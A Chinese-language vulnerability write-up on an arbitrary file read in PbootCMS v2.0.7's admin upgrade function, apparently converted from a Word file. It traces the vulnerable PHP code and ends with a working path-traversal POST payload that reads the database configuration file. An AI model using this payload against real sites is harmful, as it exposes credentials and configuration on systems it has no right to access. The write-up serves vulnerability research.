<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>PbootCMS v2.0.7 任意文件读取</h1><h2>一、漏洞简介</h2><p>仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录</p><h2>二、漏洞影响</h2><p>PbootCMS v2.0.7</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>漏洞文件apps/admin/controller/system/UpgradeController.php</p><p>&lt;?php<br />    ...<br />    public function update(){<br />        if ($_POST) {<br />            if (! ! $list = post('list')) {<br />                $list = explode(',', $list);<br />                $backdir = date('YmdHis');<br /><br />                // 分离文件<br />                foreach ($list as $value) {<br />                    if (stripos($value, '/script/') !== false) {<br />                        $sqls[] = $value;<br />                    } else {<br />                        $path = RUN_PATH . '/upgrade' . $value;<br />                        $des_path = ROOT_PATH . $value;<br />                        $back_path = DOC_PATH . STATIC_DIR . '/backup/upgrade/' . $backdir . $value;<br />                        if (! check_dir(dirname($des_path), true)) {<br />                            json(0, '目录写入权限不足，无法正常升级！' . dirname($des_path));<br />                        }<br />                        if (file_exists($des_path)) { // 文件存在时执行备份<br />                            check_dir(dirname($back_path), true);<br />                            copy($des_path, $back_path);<br />                        }<br /><br />                        // 如果后台入口文件修改过名字，则自动适配<br />                        if (stripos($path, 'admin.php') !== false &amp;&amp; stripos($_SERVER['SCRIPT_FILENAME'], 'admin.php') === false) {<br />                            if (file_exists($_SERVER['SCRIPT_FILENAME'])) {<br />                                $des_path = $_SERVER['SCRIPT_FILENAME'];<br />                            }<br />                        }<br /><br />                        $files[] = array(<br />                            'sfile' =&gt; $path,<br />                            'dfile' =&gt; $des_path<br />                        );<br />                    }<br />                }<br /><br />                // 更新数据库<br />                if (isset($sqls)) {<br />                    $db = new DatabaseController();<br />                    switch (get_db_type()) {<br />                        case 'sqlite':<br />                            copy(DOC_PATH . $this-&gt;config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this-&gt;config('database.dbname')));<br />                            break;<br />                        case 'mysql':<br />                            $db-&gt;backupDB();<br />                            break;<br />                    }<br />                    sort($sqls); // 排序<br />                    foreach ($sqls as $value) {<br />                        $path = RUN_PATH . '/upgrade' . $value;<br />                        if (file_exists($path)) {<br />                            //echo $path;<br />                            //exit;<br />                            $sql = file_get_contents($path);<br />                            if (! $this-&gt;upsql($sql)) {<br />                                $this-&gt;log("数据库 $value 更新失败!");<br />                                json(0, "数据库" . basename($value) . " 更新失败！");<br />                            }<br />                        } else {<br />                            json(0, "数据库文件" . basename($value) . "不存在！");<br />                        }<br />                    }<br />                }<br /><br />                // 替换文件<br />                if (isset($files)) {<br />                    foreach ($files as $value) {<br />                        if (! copy($value['sfile'], $value['dfile'])) {<br />                            $this-&gt;log(&quot;文件 &quot; . $value['dfile'] . &quot; 更新失败!&quot;);<br />                            json(0, &quot;文件 &quot; . basename($value['dfile']) . &quot; 更新失败，请重试!&quot;);<br />                        }<br />                    }<br />                }<br /><br />                // 清理缓存<br />                path_delete(RUN_PATH . '/upgrade', true);<br />                path_delete(RUN_PATH . '/cache');<br />                path_delete(RUN_PATH . '/complite');<br />                path_delete(RUN_PATH . '/config');<br /><br />                $this-&gt;log("系统更新成功!");<br />                json(1, '系统更新成功！');<br />            } else {<br />                json(0, '请选择要更新的文件！');<br />            }<br />        }<br />    }<br />    ...<br />?&gt;</p><p>可以看到注释写着更新数据库的部分，将$sqls遍历出来后放进了file_get_contents函数，然后调用了一个upsql()方法。跟过去看一下。</p><p>&lt;?php<br />    // 执行更新数据库<br />    private function upsql($sql){<br />        $sql = explode(';', $sql);<br />        $model = new Model();<br />        foreach ($sql as $value) {<br />            $value = trim($value);<br />            if ($value) {<br />                $model-&gt;amd($value);<br />            }<br />        }<br />        return true;<br />    }<br />?&gt;</p><p>将传过来的字符串用;分隔后又调用了一个Model::amd()方法。继续跟下去。</p><p>文件core/database/Sqlite.php</p><p>&lt;?php<br />    ...<br />    // 数据增、删、改模型，接受完整SQL语句，返回影响的行数的int数据<br />    public function amd($sql){<br />        $result = $this-&gt;query($sql, 'master');<br />        if ($result) {<br />            return $result;<br />        } else {<br />            return 0;<br />        }<br />    }<br />    // 执行SQL语句,接受完整SQL语句，返回结果集对象<br />    public function query($sql, $type = 'master'){<br />        ...<br />        switch ($type) {<br />            case 'master':<br />                if (! $this-&gt;begin) { // 存在写入时自动开启显式事务，提高写入性能<br />                    $this-&gt;master-&gt;exec('begin;');<br />                    $this-&gt;begin = true;<br />                }<br />                $result = $this-&gt;master-&gt;exec($sql) or $this-&gt;error($sql, 'master');<br />                break;<br />            case 'slave':<br />                $result = $this-&gt;slave-&gt;query($sql) or $this-&gt;error($sql, 'slave');<br />                break;<br />        }<br />        return $result;<br />    }<br />    // 显示执行错误<br />    protected function error($sql, $conn){<br />        $err = '错误：' . $this-&gt;$conn-&gt;lastErrorMsg() . '，';<br />        if ($this-&gt;begin) { // 存在显式开启事务时进行回滚<br />            $this-&gt;master-&gt;exec('rollback;');<br />            $this-&gt;begin = false;<br />        }<br />        error('执行SQL发生错误！' . $err . '语句：' . $sql);<br />    }<br />    ...<br />?&gt;</p><p>这里的amd()方法又调用了一个query()方法，在query()方法里可以看到直接将$sql放进SQL执行函数里，如果执行失败，直接将$sql打印出来。</p><p>这样看下来这里的漏洞可以拿来执行任意SQL语句，但是由于这里用的是sqlite数据库，且当前已经在后台里了，所以这里的任意SQL执行也没啥可以利用的。<strong>（可能可以审一下用数据库里的数据当做输入的点，没准能利用起来）</strong></p><p>但是由于正常的文件内容读出来直接当做SQL语句执行肯定会报错，所以这里可以用来读取文件。</p><p>经过回溯可以发现$sqls，使用的POST传输过来的数据，且数据中需要有/script/字符串。</p><h3>payload</h3><p>URL: http://www.0-sec.org/admin.php?p=/Upgrade/update<br />POST: list=/script/../../../config/database.php</p><p>即可读取到文件**（仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录）**</p><h2>参考链接</h2><p>https://xz.aliyun.com/t/7628</p></body></html>